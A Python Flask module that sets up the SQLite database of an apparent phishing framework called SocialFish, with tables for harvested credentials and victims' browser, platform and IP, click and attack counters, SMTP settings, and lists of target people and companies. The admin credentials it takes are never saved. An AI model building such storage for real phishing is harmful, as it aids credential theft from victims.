import os
import sqlite3

import click
from flask import current_app
from flask.cli import with_appcontext

from .genToken import genToken, genQRCode
from .cleanFake import cleanFake

def initDB(DATABASE, username, password):
    """
    param username: administrator username
    param password: administrator password
    """
    if not os.path.exists(DATABASE):
        conn = sqlite3.connect(DATABASE)
        cur = conn.cursor()
        create_table_sql = """ CREATE TABLE IF NOT EXISTS creds (
                                            id integer PRIMARY KEY,
                                            url text NOT NULL,
                                            jdoc text,
                                            pdate numeric,
                                            browser text,
                                            bversion text,
                                            platform text,
                                            rip text
                                        ); """
        cur.execute(create_table_sql)
        conn.commit()
        create_table_sql2 = """ CREATE TABLE IF NOT EXISTS socialfish (
                                            id integer PRIMARY KEY,
                                            clicks integer,
                                            attacks integer,
                                            token text
                                        ); """
        cur.execute(create_table_sql2)
        conn.commit()
        sql = ''' INSERT INTO socialfish(id,clicks,attacks,token)
                  VALUES(?,?,?,?) '''
        i = 1
        c = 0
        a = 0
        t = genToken()
        data = (i, c, a, t)
        cur.execute(sql,data)
        conn.commit()
        create_table_sql3 = """ CREATE TABLE IF NOT EXISTS sfmail (
                                            id integer PRIMARY KEY,
                                            email VARCHAR,
                                            smtp text,
                                            port text
                                        ); """
        cur.execute(create_table_sql3)
        conn.commit()
        sql = ''' INSERT INTO sfmail(id,email,smtp,port)
                  VALUES(?,?,?,?) '''
        i = 1
        e = ""
        s = ""
        p = ""
        data = (i, e, s, p)
        cur.execute(sql,data)
        conn.commit()
        create_table_sql4 = """ CREATE TABLE IF NOT EXISTS professionals (
                                            id integer PRIMARY KEY,
                                            email VARCHAR,
                                            name text,
                                            obs text
                                        ); """
        cur.execute(create_table_sql4)
        conn.commit()
        create_table_sql5 = """ CREATE TABLE IF NOT EXISTS companies (
                                            id integer PRIMARY KEY,
                                            email VARCHAR,
                                            name text,
                                            phone text,
                                            address text,
                                            site text
                                        ); """
        cur.execute(create_table_sql5)
        conn.commit()
        conn.close()
        genQRCode(t)


@click.command('init-db', help="flask init-db -u username -p password")
@click.option('-u', '--username', default='admin')
@click.option('-p', '--password', default='admin')
@with_appcontext
def init_db_command(username, password):
    DATABASE = current_app.config['DATABASE']
    click.echo("Initializing database... %s" %DATABASE)
    if not username or not password:
        click.echo("Define a username and password from administrator!. Initializing database failed!")
    else:
        initDB(DATABASE, username, password)
        click.echo("Database initialized!")
